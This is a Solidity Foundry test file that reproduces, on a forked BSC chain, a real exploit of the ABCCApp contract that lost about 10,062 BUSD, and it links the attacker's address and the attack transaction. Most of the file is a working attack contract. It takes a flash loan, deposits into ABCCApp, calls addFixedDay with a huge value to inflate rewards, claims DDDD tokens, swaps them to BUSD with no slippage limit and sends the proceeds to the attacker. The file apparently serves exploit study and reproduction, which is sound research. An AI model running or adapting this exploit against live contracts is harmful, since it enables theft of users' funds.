// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 10,062 BUSD
// Attacker : https://bscscan.com/address/0x53feee33527819bb793b72bd67dbf0f8466f7d2c
// Attack Contract : https://bscscan.com/address/0x90e076ef0fed49a0b63938987f2cad6b4cd97a24
// Vulnerable Contract : https://bscscan.com/address/0x1bc016c00f8d603c41a582d5da745905b9d034e5
// Attack Tx : https://bscscan.com/tx/0xee4eae6f70a6894c09fda645fb24ab841e9847a788b1b2e8cb9cc50c1866fb12

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x1bc016c00f8d603c41a582d5da745905b9d034e5#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1959457212914352530
// Hacking God : N/A

address constant PANCAKE_ROUTER = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;
address constant ERC1967PROXY = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant DDDD_TOKEN = 0x422cBee1289AAE4422eDD8fF56F6578701Bb2878;
address constant ABCCAPP_TOKEN = 0x1bC016C00F8d603c41A582d5Da745905B9D034e5;

contract ABCCApp_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 58_615_055 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        // Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = BSC_USD;

        vm.label(PANCAKE_ROUTER, "PancakeSwap: SwapRouter V3");
        vm.label(ERC1967PROXY, "ERC1967Proxy");
        vm.label(WBNB_ADDR, "WBNB");
        vm.label(BSC_USD, "BUSD");
        vm.label(DDDD_TOKEN, "DDDD");
        vm.label(ABCCAPP_TOKEN, "ABCCApp");
    }

    function testExploit() public balanceLog {
        AttackContract attackContract = new AttackContract();
        attackContract.start();
    }

    receive() external payable {}
}

contract AttackContract {
    address attacker;
    uint256 borrowedAmount = 12_500_000_000_000_000_000_000;

    constructor() {
        attacker = msg.sender;
    }

    function start() public {
        IERC1967Proxy(ERC1967PROXY).flashLoan(BSC_USD, borrowedAmount, "");
        uint256 balance = TokenHelper.getTokenBalance(BSC_USD, address(this));
        TokenHelper.transferToken(BSC_USD, attacker, balance);
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata userData) external {
        TokenHelper.approveToken(BSC_USD, ERC1967PROXY, assets);
        TokenHelper.approveToken(BSC_USD, ABCCAPP_TOKEN, assets);
        IABCCApp(ABCCAPP_TOKEN).deposit(125, address(0));
        IABCCApp(ABCCAPP_TOKEN).addFixedDay(1_000_000_000);
        IABCCApp(ABCCAPP_TOKEN).claimDDDD();

        uint256 balance = TokenHelper.getTokenBalance(DDDD_TOKEN, address(this));
        require(balance > 0, "No DDDD tokens received");
        TokenHelper.approveToken(DDDD_TOKEN, PANCAKE_ROUTER, balance);

        ISwapRouter.ExactInputParams memory params = ISwapRouter.ExactInputParams({
            path: hex"422cbee1289aae4422edd8ff56f6578701bb28780009c4bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0001f455d398326f99059ff775485246999027b3197955",
            recipient: address(this),
            deadline: block.timestamp + 100,
            amountIn: balance,
            amountOutMinimum: 0
        });
        ISwapRouter(PANCAKE_ROUTER).exactInput(params);
    }

    receive() external payable {}
}

interface IERC1967Proxy {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface ISwapRouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams memory params) external returns (uint256);
}

interface IABCCApp {
    function deposit(uint256 number, address referer) external;
    function addFixedDay(uint256 target) external;
    function claimDDDD() external;
}
